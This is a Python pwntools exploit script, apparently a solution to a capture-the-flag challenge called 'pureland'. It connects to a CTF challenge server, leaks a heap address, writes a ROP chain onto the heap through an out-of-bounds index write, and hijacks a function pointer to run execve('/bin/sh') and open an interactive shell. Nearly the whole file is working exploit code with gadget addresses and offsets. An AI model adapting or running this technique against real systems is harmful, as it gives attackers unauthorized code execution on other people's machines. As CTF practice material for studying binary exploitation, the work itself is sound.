#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+2900+0', '-e']
#context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'info'

exe = ELF("pureland")

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]
#onegadgets = one_gadget(libc.path, libc.address)

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


host, port = "f-u-hetzner-challs.ifctf.fibonhack.it", "10013"

if args.REMOTE:
  p = remote(host,port)
elif args.DOCKER:
  p = remote('127.0.0.1', 5000)
else:
  p = process([exe.path])

sla(':\n', '1')
sla(': \n', '0')
sla(': \n', '3735928559')
sla(':\n', '3')

sla(':\n', '2')
sla(': \n', '19')
heap = int(rcu('is ','\n'),10)
logleak('heap at', heap)

# gadgets
leave_ret = 0x00000000004b51ff # leave; ret
pop_rax = 0x00000000004757f5 # pop rax ; add r14b, r14b ; ret
syscall = 0x000000000044b977 # syscall;
pop3 = 0x00000000004848f4 # pop rbp ; pop r12 ; pop r13 ; ret

offset = 0x1690

payload = b'\x00'*8+p64(leave_ret)
payload += p64(pop3)+p64(0)+p64(0)+p64(0)+p64(heap+(offset-0x80)+8)+p64(heap+(offset-0x80)+0x40)+b'/bin/sh\x00'+p64(pop_rax)+p64(59)+p64(0)*2+p64(syscall)
payload += b'\x00'

# write our payload on heap
for i in range(len(payload)>>3):
  print(str( (offset+(i*8))>>3))
  sla(':\n', '1')
  sla(': \n', str((offset+(i*8))>>3))
  sla(': \n', str(u64(payload[(i*8):(i*8)+8])))

# function that we will abuse to have code execution , execve('/bin/sh', 0, 0)
'''
> 0x000000000043ad3b:	mov    rcx,QWORD PTR [rbx+0xf]
   0x000000000043ad3f:	mov    rdx,QWORD PTR [rbx+0x17]
   0x000000000043ad43:	mov    rsi,QWORD PTR [rbx+0x27]
   0x000000000043ad47:	mov    rdi,QWORD PTR [rbx+0x37]
   0x000000000043ad4b:	mov    r8,QWORD PTR [rbx+0x47]
   0x000000000043ad4f:	mov    r9,QWORD PTR [rbx+0x4f]
   0x000000000043ad53:	mov    r10,QWORD PTR [rbx+0x67]
   0x000000000043ad57:	mov    rbx,QWORD PTR [rbx+0x2f]
   0x000000000043ad5b:	mov    QWORD PTR [rbp-0x38],rcx
   0x000000000043ad5f:	mov    QWORD PTR [rbp-0x30],rdx
   0x000000000043ad63:	mov    QWORD PTR [rbp-0x28],rsi
   0x000000000043ad67:	mov    QWORD PTR [rbp-0x20],rdi
   0x000000000043ad6b:	mov    QWORD PTR [rbp-0x18],r8
   0x000000000043ad6f:	mov    QWORD PTR [rbp-0x10],r9
   0x000000000043ad73:	mov    QWORD PTR [rbp-0x8],r10
   0x000000000043ad77:	mov    QWORD PTR [rbp+0x0],rax
   0x000000000043ad7b:	add    rbp,0xffffffffffffffc0
   0x000000000043ad7f:	test   bl,0x7
   0x000000000043ad82:	jne    0x43ad98
   0x000000000043ad84:	jmp    QWORD PTR [rbx]
'''
if args.GDB:
  pause()

# different offset in docker or local
if args.REMOTE or args.DOCKER:
  off = 345*8
else:
  off = 389*8

sla(':\n', '1')
sla(': \n', str((off)>>3))
sla(': \n', str(heap+(offset-0x80)+1))

p.interactive()
